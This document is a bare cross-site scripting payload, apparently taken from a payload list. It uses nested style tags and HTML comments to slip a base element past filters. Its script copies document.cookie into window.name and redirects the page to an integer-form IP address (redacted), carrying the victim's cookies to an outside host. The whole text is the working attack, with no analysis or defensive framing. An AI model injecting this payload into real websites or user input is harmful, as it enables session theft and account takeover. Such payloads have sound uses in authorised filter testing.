ff<style><!--</style><a id="--><base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'></base><!--"></a><style>--></style>
```
